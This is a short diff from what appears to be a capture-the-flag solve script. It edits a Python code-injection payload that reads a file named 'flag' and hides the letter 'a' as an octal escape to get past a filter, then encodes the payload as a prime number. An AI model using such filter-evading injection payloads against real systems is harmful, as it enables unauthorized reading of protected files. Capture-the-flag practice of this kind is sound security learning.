@@ -4,7 +4,7 @@ from sympy import nextprime
 
 r = process(["python3.10", "main.py"])
 
-payload = b"[c:=getattr(open('fl\\141g'),'read')()]" + b"a"*50
+payload = b"c=getattr(open('fl\\141g'),'read')()#" + b"a"*50
 payload = bytes_to_long(payload)
 payload = nextprime(payload)
 
